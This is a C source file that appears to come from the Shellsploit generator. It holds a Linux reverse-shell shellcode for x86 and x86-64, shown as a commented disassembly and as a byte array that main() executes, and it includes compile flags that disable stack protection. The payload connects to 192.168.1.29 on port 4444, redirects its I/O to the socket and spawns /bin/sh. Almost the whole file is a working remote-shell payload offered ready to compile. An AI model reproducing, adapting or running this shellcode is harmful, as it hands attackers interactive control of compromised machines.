/*
[+] Author : B3mB4m
[~] Contact : b3mb4m@protonmail.com
[~] Project : https://github.com/b3mb4m/Shellsploit
[~] Greetz : Bomberman,T-Rex,KnocKout,ZoRLu


#If you want test it, you must compile it within x86 OS.
#Or basically you can get it with shellsploit.
#Default setthings for port:4444 host:192.168.1.29

00000000 31C0 xor eax,eax
00000002 40 inc eax
00000003 7448 jz 0x4d
00000005 6A66 push byte +0x66
00000007 58 pop eax
00000008 99 cdq
00000009 52 push edx
0000000A 42 inc edx
0000000B 52 push edx
0000000C 89D3 mov ebx,edx
0000000E 42 inc edx
0000000F 52 push edx
00000010 89E1 mov ecx,esp
00000012 CD80 int 0x80
00000014 93 xchg eax,ebx
00000015 89D1 mov ecx,edx
00000017 B03F mov al,0x3f
00000019 CD80 int 0x80
0000001B 49 dec ecx
0000001C 79F9 jns 0x17
0000001E B066 mov al,0x66
00000020 87DA xchg ebx,edx
00000022 68C0A8011D push dword 0x1d01a8c0
00000027 6668115C push word 0x5c11
0000002B 6653 push bx
0000002D 43 inc ebx
0000002E 89E1 mov ecx,esp
00000030 6A10 push byte +0x10
00000032 51 push ecx
00000033 52 push edx
00000034 89E1 mov ecx,esp
00000036 CD80 int 0x80
00000038 6A0B push byte +0xb
0000003A 58 pop eax
0000003B 99 cdq
0000003C 89D1 mov ecx,edx
0000003E 52 push edx
0000003F 682F2F7368 push dword 0x68732f2f
00000044 682F62696E push dword 0x6e69622f
00000049 89E3 mov ebx,esp
0000004B CD80 int 0x80
0000004D 48 dec eax
0000004E 31C0 xor eax,eax
00000050 48 dec eax
00000051 31FF xor edi,edi
00000053 48 dec eax
00000054 31F6 xor esi,esi
00000056 48 dec eax
00000057 31D2 xor edx,edx
00000059 4D dec ebp
0000005A 31C0 xor eax,eax
0000005C 6A02 push byte +0x2
0000005E 5F pop edi
0000005F 6A01 push byte +0x1
00000061 5E pop esi
00000062 6A06 push byte +0x6
00000064 5A pop edx
00000065 6A29 push byte +0x29
00000067 58 pop eax
00000068 0F05 syscall
0000006A 49 dec ecx
0000006B 89C0 mov eax,eax
0000006D 48 dec eax
0000006E 31F6 xor esi,esi
00000070 4D dec ebp
00000071 31D2 xor edx,edx
00000073 41 inc ecx
00000074 52 push edx
00000075 C6042402 mov byte [esp],0x2
00000079 66C7442402115C mov word [esp+0x2],0x5c11
00000080 C7442404C0A8011D mov dword [esp+0x4],0x1d01a8c0
00000088 48 dec eax
00000089 89E6 mov esi,esp
0000008B 6A10 push byte +0x10
0000008D 5A pop edx
0000008E 41 inc ecx
0000008F 50 push eax
00000090 5F pop edi
00000091 6A2A push byte +0x2a
00000093 58 pop eax
00000094 0F05 syscall
00000096 48 dec eax
00000097 31F6 xor esi,esi
00000099 6A03 push byte +0x3
0000009B 5E pop esi
0000009C 48 dec eax
0000009D FFCE dec esi
0000009F 6A21 push byte +0x21
000000A1 58 pop eax
000000A2 0F05 syscall
000000A4 75F6 jnz 0x9c
000000A6 48 dec eax
000000A7 31FF xor edi,edi
000000A9 57 push edi
000000AA 57 push edi
000000AB 5E pop esi
000000AC 5A pop edx
000000AD 48 dec eax
000000AE BF2F2F6269 mov edi,0x69622f2f
000000B3 6E outsb
000000B4 2F das
000000B5 7368 jnc 0x11f
000000B7 48 dec eax
000000B8 C1EF08 shr edi,byte 0x8
000000BB 57 push edi
000000BC 54 push esp
000000BD 5F pop edi
000000BE 6A3B push byte +0x3b
000000C0 58 pop eax
000000C1 0F05 syscall
*/


//Project : https://github.com/b3mb4m/Shellsploit
//This file created with shellsploit ..
//19/01/2016 - 00:39:58
//Compile : gcc -fno-stack-protector -z execstack shell.c -o shell

unsigned char shellcode[] =
"\x31\xc0\x40\x74\x48\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68\xc0\xa8\x01\x1d\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x01\x1d\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";

int main(void){
(*(void(*)()) shellcode)();
}